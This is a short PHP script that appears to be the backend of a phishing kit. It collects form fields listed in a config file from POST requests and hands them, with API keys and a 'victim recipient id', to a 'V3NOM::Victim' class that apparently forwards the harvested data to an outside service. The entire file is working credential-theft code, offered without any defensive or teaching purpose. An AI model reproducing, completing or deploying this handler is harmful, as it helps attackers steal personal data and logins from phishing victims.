<?php
require_once __DIR__ . '/../lib/function.php';
require_once __DIR__ . '/../lib/curl.php';
require_once __DIR__ . '/../config.php';
// if not POST method then return blank.
if (!isMethod('POST')) return;
session_start();

foreach ($config['data'] as $key => $value) {
    $data[$key] = _POST($value);
}

if ($config['mode'] == 'live') {
    $receiver = _POST('key');
} else {
    $receiver = 'sandbox';
}

// main class.
$io = V3NOM::Victim([
    'app_key' => $config['app_key'],
    'secret_key' => $config['secret_key'],
    'receiver' => $receiver, // victim recipient id.
    'data' => $data
]);

// Check data sent or not.
$io = json_decode($io, true);
if ($io['status'] == 'success') {
    $res['success']($io['data']);
} else {
    $res['failed']($io['data']);
}
